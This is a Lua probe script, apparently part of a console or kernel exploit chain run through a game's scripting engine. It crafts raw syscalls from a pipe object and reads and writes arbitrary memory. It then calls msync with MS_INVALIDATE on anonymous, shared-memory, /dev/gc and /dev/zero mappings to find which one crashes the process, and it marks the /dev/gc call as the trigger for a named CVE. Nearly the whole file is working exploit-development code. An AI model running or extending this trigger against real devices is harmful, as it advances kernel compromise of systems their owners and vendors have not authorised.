-- CRASH_CLASS: MODERATE
-- PROBE 67c: msync isolation — which variant crashes?
--
-- Context: Probe 67a crashed the game process during section [A] (shm msync test).
-- The output ended after writing the sentinel (0xDEADBEEF) to shm mmap.
-- This probe tests each msync variant INDIVIDUALLY with careful alive() checks
-- to pinpoint exactly which operation is lethal.
--
-- The crash occurred BEFORE reaching the /dev/gc device pager test,
-- so the crash may be in shm msync, not device msync.

print("=== PROBE 67c: MSYNC ISOLATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc_getpid = make_syscall(20)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_msync = make_syscall(227)
local sc_madvise = make_syscall(75)
local sc_shm_open = make_syscall(482)
local sc_ftruncate = make_syscall(480)

local function alive()
    local ok, v = pcall(function() return sc_getpid() end)
    return ok
end

local pid = to_num(sc_getpid())
print("PID: " .. pid)
print("")

local function write_str(str)
    local buf = memory.alloc(#str + 8)
    for i = 0, math.floor(#str / 4) do
        local dw = 0
        for j = 0, 3 do
            local idx = i * 4 + j + 1
            if idx <= #str then dw = dw + string.byte(str, idx) * (256 ^ j) end
        end
        safe_wd(buf + i * 4, dw)
    end
    return buf
end

local MS_SYNC = 0
local MS_ASYNC = 1
local MS_INVALIDATE = 2
local PAGE_SIZE = 0x4000

-- [1] Create a simple anonymous mmap (not device-backed, not shm)
print("[1] msync on anonymous mmap")
local anon_ok, anon_ret = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(3),  -- PROT_RW
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))       -- MAP_PRIVATE|MAP_ANON
end)
local anon_addr = anon_ok and anon_ret or nil
print("  mmap(ANON) = " .. hexval(anon_addr))
if anon_addr then
    safe_wd(anon_addr, 0xAAAA0001)
    print("  wrote 0xAAAA0001, read back: " .. string.format("0x%08X", safe_rd(anon_addr) or 0))

    -- MS_SYNC on anon
    local s1_ok, s1_ret = pcall(function()
        return sc_msync(uint64(anon_addr), uint64(PAGE_SIZE), uint64(MS_SYNC))
    end)
    print("  msync(MS_SYNC) = " .. (s1_ok and to_num(s1_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_SYNC ON ANON ***") return end

    -- MS_ASYNC on anon
    local s2_ok, s2_ret = pcall(function()
        return sc_msync(uint64(anon_addr), uint64(PAGE_SIZE), uint64(MS_ASYNC))
    end)
    print("  msync(MS_ASYNC) = " .. (s2_ok and to_num(s2_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_ASYNC ON ANON ***") return end

    -- MS_INVALIDATE on anon
    local s3_ok, s3_ret = pcall(function()
        return sc_msync(uint64(anon_addr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (s3_ok and to_num(s3_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_INVALIDATE ON ANON ***") return end

    local post_val = safe_rd(anon_addr)
    print("  post-invalidate read = " .. string.format("0x%08X", post_val or 0))

    pcall(function() sc_munmap(uint64(anon_addr), uint64(PAGE_SIZE)) end)
end
print("")
if not alive() then print("DEAD") return end

-- [2] msync on shm mmap (MAP_SHARED)
print("[2] msync on shm mmap")
local shm_name = write_str("/msync_isolate_67c")
repeat
    local sh_ok, sh_ret = pcall(function()
        return sc_shm_open(uint64(shm_name), uint64(0x602), uint64(0x1FF))
    end)
    local sh_fd = sh_ok and to_num(sh_ret) or -1
    print("  shm_open = " .. sh_fd)
    if sh_fd < 0 then break end

    pcall(function() sc_ftruncate(uint64(sh_fd), uint64(PAGE_SIZE)) end)

    local sm_ok, sm_ret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(3),
            uint64(1), uint64(sh_fd), uint64(0))  -- MAP_SHARED
    end)
    local sm_addr = sm_ok and sm_ret or nil
    print("  mmap(SHARED) = " .. hexval(sm_addr))
    if not sm_addr then
        pcall(function() sc_close(uint64(sh_fd)) end)
        break
    end

    safe_wd(sm_addr, 0xBBBB0002)
    print("  wrote sentinel, alive = " .. tostring(alive()))

    -- Test MS_SYNC first
    print("  >>> msync(MS_SYNC) on shm...")
    local ms1_ok, ms1_ret = pcall(function()
        return sc_msync(uint64(sm_addr), uint64(PAGE_SIZE), uint64(MS_SYNC))
    end)
    print("  msync(MS_SYNC) = " .. (ms1_ok and to_num(ms1_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_SYNC ON SHM ***") return end

    -- Test MS_ASYNC
    print("  >>> msync(MS_ASYNC) on shm...")
    local ms2_ok, ms2_ret = pcall(function()
        return sc_msync(uint64(sm_addr), uint64(PAGE_SIZE), uint64(MS_ASYNC))
    end)
    print("  msync(MS_ASYNC) = " .. (ms2_ok and to_num(ms2_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_ASYNC ON SHM ***") return end

    -- Test MS_INVALIDATE — this was the next call when 67a crashed
    print("  >>> msync(MS_INVALIDATE) on shm... (THIS IS THE SUSPECTED CRASH POINT)")
    local ms3_ok, ms3_ret = pcall(function()
        return sc_msync(uint64(sm_addr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (ms3_ok and to_num(ms3_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_INVALIDATE ON SHM ***") return end

    -- Read after invalidation
    local post = safe_rd(sm_addr)
    print("  post-invalidate read = " .. string.format("0x%08X", post or 0))
    if not alive() then print("  *** DEAD AFTER POST-INVALIDATE READ ***") return end

    pcall(function() sc_munmap(uint64(sm_addr), uint64(PAGE_SIZE)) end)
    pcall(function() sc_close(uint64(sh_fd)) end)
until true
print("")
if not alive() then print("DEAD") return end

-- [3] msync on GPU mmap (only if sections 1-2 survived)
print("[3] msync on /dev/gc mmap (device-backed)")
local gc_path = write_str("/dev/gc")
repeat
    local gc_ok, gc_ret = pcall(function()
        return sc_open(uint64(gc_path), uint64(6), uint64(0))  -- O_RDWR|O_NONBLOCK
    end)
    local gc_fd = gc_ok and to_num(gc_ret) or -1
    print("  open(/dev/gc) = " .. gc_fd)
    if gc_fd < 0 then break end

    local gm_ok, gm_ret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(3),
            uint64(1), uint64(gc_fd), uint64(0))  -- MAP_SHARED
    end)
    local gm_addr = gm_ok and gm_ret or nil
    local gmh, gml = 0, 0
    if gm_addr then gmh, gml = get_hi_lo(gm_addr) end
    print("  mmap = " .. hexval(gm_addr))
    if not gm_addr or (gmh == 0xFFFFFFFF and gml == 0xFFFFFFFF) then
        pcall(function() sc_close(uint64(gc_fd)) end)
        break
    end

    -- Read initial
    local init_v = safe_rd(gm_addr)
    print("  initial read = " .. string.format("0x%08X", init_v or 0))

    -- MS_SYNC
    print("  >>> msync(MS_SYNC) on /dev/gc...")
    local g1_ok, g1_ret = pcall(function()
        return sc_msync(uint64(gm_addr), uint64(PAGE_SIZE), uint64(MS_SYNC))
    end)
    print("  msync(MS_SYNC) = " .. (g1_ok and to_num(g1_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_SYNC ON /dev/gc ***") return end

    -- MS_ASYNC
    print("  >>> msync(MS_ASYNC) on /dev/gc...")
    local g2_ok, g2_ret = pcall(function()
        return sc_msync(uint64(gm_addr), uint64(PAGE_SIZE), uint64(MS_ASYNC))
    end)
    print("  msync(MS_ASYNC) = " .. (g2_ok and to_num(g2_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_ASYNC ON /dev/gc ***") return end

    -- MS_INVALIDATE — the CVE trigger
    print("  >>> msync(MS_INVALIDATE) on /dev/gc... (CVE-2026-49418 TRIGGER)")
    local g3_ok, g3_ret = pcall(function()
        return sc_msync(uint64(gm_addr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (g3_ok and to_num(g3_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_INVALIDATE ON /dev/gc (CVE TRIGGERED?) ***") return end

    -- Post-invalidate read (triggers page fault = re-insert)
    print("  >>> reading after invalidate (page fault)...")
    local gp_ok, gp_v = pcall(function() return memory.read_dword(gm_addr) end)
    print("  post-invalidate read = " .. (gp_ok and string.format("0x%08X", to_num(gp_v)) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER PAGE FAULT ON /dev/gc ***") return end

    pcall(function() sc_munmap(uint64(gm_addr), uint64(PAGE_SIZE)) end)
    pcall(function() sc_close(uint64(gc_fd)) end)
until true
print("")
if not alive() then print("DEAD") return end

-- [4] msync on /dev/zero mmap
print("[4] msync on /dev/zero mmap")
local zero_path = write_str("/dev/zero")
repeat
    local z_ok, z_ret = pcall(function()
        return sc_open(uint64(zero_path), uint64(2), uint64(0))  -- O_RDWR
    end)
    local z_fd = z_ok and to_num(z_ret) or -1
    print("  open(/dev/zero) = " .. z_fd)
    if z_fd < 0 then break end

    -- MAP_SHARED for device pager path (MAP_PRIVATE uses swap pager)
    local zm_ok, zm_ret = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(3),
            uint64(1), uint64(z_fd), uint64(0))  -- MAP_SHARED
    end)
    local zm_addr = zm_ok and zm_ret or nil
    print("  mmap(MAP_SHARED) = " .. hexval(zm_addr))
    if not zm_addr then
        -- Try MAP_PRIVATE
        local zp_ok, zp_ret = pcall(function()
            return sc_mmap(uint64(0), uint64(PAGE_SIZE), uint64(3),
                uint64(2), uint64(z_fd), uint64(0))  -- MAP_PRIVATE
        end)
        zm_addr = zp_ok and zp_ret or nil
        print("  mmap(MAP_PRIVATE) = " .. hexval(zm_addr))
    end
    if not zm_addr then
        pcall(function() sc_close(uint64(z_fd)) end)
        break
    end

    print("  >>> msync(MS_INVALIDATE) on /dev/zero...")
    local zi_ok, zi_ret = pcall(function()
        return sc_msync(uint64(zm_addr), uint64(PAGE_SIZE), uint64(MS_INVALIDATE))
    end)
    print("  msync(MS_INVALIDATE) = " .. (zi_ok and to_num(zi_ret) or "PCALL_FAIL"))
    if not alive() then print("  *** DEAD AFTER MS_INVALIDATE ON /dev/zero ***") return end

    local zp = safe_rd(zm_addr)
    print("  post-invalidate read = " .. string.format("0x%08X", zp or 0))

    pcall(function() sc_munmap(uint64(zm_addr), uint64(PAGE_SIZE)) end)
    pcall(function() sc_close(uint64(z_fd)) end)
until true

print("")
print("=== PROBE 67c COMPLETE ===")
